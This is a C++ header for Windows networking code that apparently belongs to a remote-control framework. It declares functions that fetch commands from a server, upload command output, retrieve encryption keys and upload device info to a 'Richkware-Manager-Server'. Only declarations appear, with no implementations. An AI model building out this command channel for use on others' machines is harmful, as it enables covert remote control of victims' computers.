/*
*      Copyright 2016 Riccardo Melioli.
*/

#ifndef NETWORK_H_
#define NETWORK_H_

#ifndef _WIN32_WINNT
#define _WIN32_WINNT  0x501
#endif

#include <winsock2.h>
#include <ws2tcpip.h>

#include <string>

#include <HTTPRequest.hpp>

#include "utils.h"
#include "crypto.h"
#include "protocol.h"


struct ServerThreadArgs {
    std::string encryptionKey;
    SOCKET ListenSocket;
};

struct ClientSocketThreadArgs {
    std::string encryptionKey;
    SOCKET ClientSocket;

};

class Server {
private:
    std::string encryptionKey;
    std::string port;
    HANDLE hThread;
    SOCKET listenSocket;
    ServerThreadArgs sta;
public:
    Server() {}

    Server(std::string encryptionKeyArg);

    Server &operator=(const Server &server);

    void Start(std::string port, bool encrypted = false);

    void Stop();

    HANDLE getHhread();

    std::string getPort();

};

class Network {
private:
    std::string encryptionKey;
    std::string defaultEncryptionKey;
    std::string serverAddress;
    std::string port;
    std::string associatedUser;
public:
    Server server;

    Network() {}

    //Network(const std::string &encryptionKeyArg);

    Network(const std::string &serverAddress, const std::string &port,
            const std::string &associatedUser,
            const std::string &encryptionKey);

    Network(const std::string &serverAddress, const std::string &port,
            const std::string &associatedUser,
            const std::string &encryptionKey,const std::string &defaultEncryptionKey);

    Network &operator=(const Network &network);

    std::string RawRequest(const char *serverAddress, const char *port, const char *request);

    std::string fetchCommand(/*const std::string &encryptionKey*/);

    bool uploadCommand(std::string commandsOutput/*, const std::string &encryptionKey*/);

    const char *ResolveAddress(const char *address);

    std::string GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser);

    static std::string
    RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request);

    static std::string ResolveAddress(const std::string &address);

    std::string GetEncryptionKeyFromRMS();

    static std::string GetEncryptionKeyFromRMS(const std::string &serverAddress, const std::string &port,
                                               const std::string &associatedUser,
                                               const std::string &encryptionKey);

    // upload info to Richkware-Manager-Server
    bool UploadInfoToRMS();

    static bool UploadInfoToRMS(const std::string &serverAddress, const std::string &port, const std::string &associatedUser,
                         const std::string &serverPort, const std::string &encryptionKey,
                         const std::string &defaultEncryptionKey);
};

class Device {
private:
    std::string name;
    std::string serverPort;
public:
    Device() {}

    Device(std::string nameArg, std::string serverPort);

    Device &operator=(const Device &device);

    std::string getName();

    std::string getServerPort();

    void setName(std::string nameArg);

    void setServerPort(std::string serverPort);
};

DWORD WINAPI ServerThread(void *arg);

DWORD WINAPI ClientSocketThread(void *arg);

#endif /* NETWORK_H_ */
